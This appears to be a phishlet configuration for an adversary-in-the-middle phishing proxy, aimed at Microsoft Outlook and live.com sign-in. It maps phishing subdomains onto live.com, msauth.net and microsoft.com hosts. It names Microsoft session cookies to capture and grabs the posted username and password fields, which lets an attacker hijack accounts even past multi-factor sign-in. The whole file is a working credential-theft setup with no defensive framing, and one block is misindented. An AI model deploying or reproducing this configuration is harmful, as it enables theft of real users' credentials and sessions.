author: '@isloj16'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'browser.events.data', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
sub_filters:
#  - {triggers_on: 'login', orig_sub: 'login', domain: 'live.com', search: 'ru=https://{hostname}/login.srf', replace: 'ru=https://{orig_hostname}/login.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: '.live.com'
    keys: ['sid', 'WLSSC','RPSSecAuth', 'MSPOK', 'MSCC', 'OParams', 'MSPRequ', '__Host-MSAAUTH']
    - domain: '.microsoft.com'
    keys: ['__UCIS_I', 'MS0', 'MC1', 'MSFPC', 'ai_session']
  - domain: 'privacynotice.account.microsoft.com'
    keys: ['__UCIS_I', 'MS0', 'MC1', 'MSFPC', 'ai_session']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'outlook.live.com'
  path: '/owa/?nlp=1'
